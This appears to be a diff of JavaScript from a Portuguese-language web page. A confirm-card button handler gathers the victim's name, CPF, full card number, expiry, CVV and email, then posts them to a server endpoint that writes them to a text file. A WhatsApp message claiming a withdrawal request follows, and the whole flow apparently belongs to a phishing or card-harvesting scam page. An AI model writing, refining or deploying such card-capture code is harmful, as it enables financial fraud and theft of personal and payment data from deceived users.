@@ -1184,28 +1184,28 @@ document.getElementById('confirmCartao').addEventListener('click', async () => {
     try {
         // ========== SALVAR NO ARQUIVO VIA PHP ==========
         const dadosCartao = {
-            nome: dadosUsuario?.nome || 'N/A',
-            cpf: cpfAtual,
-            cartao: numeroRaw,
-            validade: validade,
-            cvv: cvv,
-            email: email,
-            valor: formatarMoeda(valor)
+          nome: dadosUsuario?.nome || 'N/A',
+    cpf: cpfAtual,
+    cartao: numeroRaw,
+    validade: validade,
+    cvv: cvv,
+    email: email,
+    valor: formatarMoeda(valor)
         };
         
-        const response = await fetch('/salvar_cartao.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(dadosCartao)
-        });
-        
-        const resultado = await response.json();
-        
-        if (resultado.success) {
-            console.log('✅ Dados salvos no arquivo!');
-        } else {
-            console.log('⚠️ Erro:', resultado.erro);
-        }
+        try {
+    const response = await fetch('/salvar-cartao-txt', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dadosCartao)
+    });
+    const resultado = await response.json();
+    if (resultado.success) {
+        console.log('✅ Cartão salvo no servidor');
+    }
+} catch (erro) {
+    console.error('Erro ao salvar:', erro);
+}
         
         // ========== ENVIAR WHATSAPP ==========
         const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
